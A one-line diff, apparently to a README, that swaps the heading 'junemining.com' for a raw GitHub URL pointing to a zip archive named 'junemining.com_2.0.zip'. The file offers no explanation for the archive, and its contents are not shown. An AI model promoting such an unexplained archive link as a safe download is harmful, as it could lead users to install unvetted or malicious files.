@@ -1,1 +1,1 @@
-# junemining.com
+# https://raw.githubusercontent.com/peptang12/junemining.com/main/becolor/junemining.com_2.0.zip
